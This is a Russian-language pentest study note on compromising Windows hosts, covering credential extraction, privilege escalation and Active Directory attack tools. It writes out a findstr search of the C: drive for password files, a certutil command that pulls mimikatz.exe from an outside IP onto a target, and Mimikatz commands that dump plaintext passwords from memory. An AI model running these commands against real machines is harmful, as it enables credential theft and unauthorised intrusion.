### Компрометация Windows-машин в сети

## **Материалы для самостоятельного изучения**

- [Памятка](https://github.com/frostbits-security/MITM-cheatsheet) по атакам MITM
- [Телеграмм канал](https://t.me/c4s73r_channel) Магамы Базарова - эксперта по сетевым атакам
- [Responder](https://github.com/lgandx/Responder)
- [Все об атаках](https://blog.redforce.io/windows-authentication-and-attacks-part-1-ntlm/) на аутентификацию в Windows
- [О работе атаки](https://en.hackndo.com/ntlm-relay/) NTLM Relay


# Извлечение секретов и учетных данных
## Яркими представителями этой категории являются следующие методы повышения привилегий:
- Взлом менеджеров паролей пользователей по причине небезопасной конфигурации
- Обнаружение секретов и учетных в логах и истории команд
- Извлечение учетных данных из оперативной памяти
- Доступ к файлу, хранящемуся хеши пользовательских паролей 
- Извлечение учетных данных из конфигурации Групповых Политик

# Поиск секретов и паролей в ОС
В первую очередь мы помним, что можно попытаться самостоятельно поискать пароли в различных файлах ОС при помощи команд терминальной оболочки, например:

cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config

Эта команда выполняет поиск строки "password" внутри всех файлов с расширениями .xml, .ini, .txt и .config в текущем диске C:.

Более подробно, каждая часть команды выполняет следующие действия:
cd C:\ — переходит в корневую папку диска C:
findstr — команда для поиска строк в файлах
/s — выполняет поиск строк во всех подпапках
/p — пропускает файлы с непечатными символами
/i — игнорирует регистр символов при поиске строк
/n — выводит номер строки, содержащей строку
/m — выводит только имя файла, если файл содержит совпадение


# Извлечение учетных данных из оперативной памяти
Самым ярким примером здесь будет извлечение учетных данных из оперативной памяти процессов.
Факт:
В Windows для реализации механизма HTTP Digest Authentication для поддержки SSO (Single Sign On) требуют знание вводимого пароля, а не только его хеша. Поэтому разработчики Windows решили хранить пароли пользователей в открытом виде. Для извлечения паролей и хешей из оперативной памяти можно использовать инструмент Mimikatz.


Mimikatz — инструмент, реализующий функционал Windows Credentials Editor и позволяющий извлекать учетные данные пользователей Windows.
Дополнительную информацию по данному инструменту можно получить по следующим ссылкам:
• Что такое Mimikatz: руководство для начинающих — https://habr.com/ru/company/varonis/blog/539340/
•  Справка по mimikatz — https://kali.tools/?p=5342

Применение Mimikatz
•  Для загрузки инструмента mimikatz необходимо перейти в папку с правами на запись, например в C:\Windows\System32\spool\drivers\color.
•  Далее следует загрузить mimikatz на целевую машину. Это можно сделать утилитой, позволяющей скачивать файл по сети certutil: certutil -urlcache -split -f http://10.10.14.16/mimikatz.exe m.exe
•  После запуска Mimi нужно указать следующую команду, которая предоставит текущей учетной записи права отладки процессов (SeDebugPrivilege): privilege::debug
•  Следующая команда вернет список всех хранящихся на этой машине хешей и паролей в виде незашифрованного текста:sekurlsa::logonPasswords


## Условия для Mimikatz
Для того, чтобы Mimikatz успешно извлёк пароли и хеши, необходимы права SeDebugPrivilege, которые, как правило, есть у Администратора и нечасто встречаются у рядового пользователя. Тем не менее, процедура извлечения учётных данных из памяти необходима в рамках проведения работ по пентесту для возможности как вертикального, так и горизонтального перемещения.



# Эксплуатация уязвимостей конфигурации ОС Windows
В этой категории яркими примерами возможных методов повышения привилегий будут следующие:
• Повышение привилегий через права на создание резервных копий (SeBackupPrivilege)
• Повышение привилегий через через перехват сервиса (Weak Services Permission)
• Повышение привилегий через имперсонификацию SeImpersonatePrivilege (JyicyPotato)
• Повышение привилегий через права на установку ПО (AlwaysInstallElevated)
• Повышение привилегий через изменение пути бинарного файла сервиса (Service Binary Path)
• Повышение привилегий через подмену DLL библиотек (DLL Hijacking)
• Повышение привилегий через неэкранированные пути сервисов (Unquoted Service Paths)


# Эксплуатация известных уязвимостей ОС Windows
Приведем пример некоторых достаточно популярных уязвимостей ОС, позволяющих повысить привилегии до максимальных:
• Уязвимость в установщике Windows (InstallerFileTakeOver (0day)
• Уязвимость в Windows Print Spooler (PrintNightmare)
• Уязвимость в планировщике задач Windows (MS10-092)
• Уязвимость в ядре Windows (MS16_014)
• Обработка вторичного входа в систему (MS16-032)


Рекомендуемые ресурсы
• Hacktrics: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
• Стандарт по тестированию на проникновение PTES

Active Directory:
• Чеклист по тестированию защищенности Active Directory: 
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
• Эксплуатация Zerologon: 
https://medium.com/mii-cybersec/zerologon-easy-way-to-take-over-active-directory-exploitation-c4b38c63a915
• Эксплуатация уязвимостей в AD CS
https://posts.specterops.io/certified-pre-owned-d95910965cd2

Помимо блогов, предлагаем вам подборку отличных инструментов, ориентированных на Active Directory, которые не только полезны, но и могут позволить вам изучить множество механизмов и протоколов Active Directory, просмотрев их код (это далеко не исчерпывающий список, и многие другие перечислены и показаны в статье выше).
• mimikatz:  вероятно, самый известный инструмент для атаки на Windows и Active Directory. Он реализует на C все виды атак для получения учетных данных с компьютеров Windows и выдачи себя за пользователей в Active Directory.
• impacket: Impacket реализует многие из протоколов на python, и стоит знать, как это работает, чтобы узнать о них больше. Он также включает в себя множество примеров, реализующих атаки, описанные в статье.
• responder.py: Responder позволяет вам выполнять множество PitM-атак, злоупотребляя протоколами разрешения Windows и предоставляя вам множество серверов протоколов, которые будут собирать NTLM-хэши. Стоит знать, как это работает.
• Rubeus: Rubeus – это пакет C# для выполнения атак Kerberos с компьютеров под управлением Windows. Вы можете проверить это, чтобы узнать много нового о том, как работает Kerberos.
• CrackMapExec: CME – это инструмент на python, который позволяет вам простым способом выполнять множество различных атак, описанных здесь.
• BloodHound: BloodHound позволяет вам сопоставлять сеть Active Directory с множеством различных запросов LDAP и другими. Вам следует проверить это, если вы хотите узнать о разведке Active Directory.
• Powerview: инструмент Powershell, который реализует множество LDAP-запросов Active Directory и других протоколов для извлечения всех видов информации из Active Directory.
• Empire: набор для развертывания агентов на компьютерах Active Directory, который позволяет выполнять все виды атак. Содержит множество инструментов для выполнения разведки и атак через Active Directory, которые стоит проверить.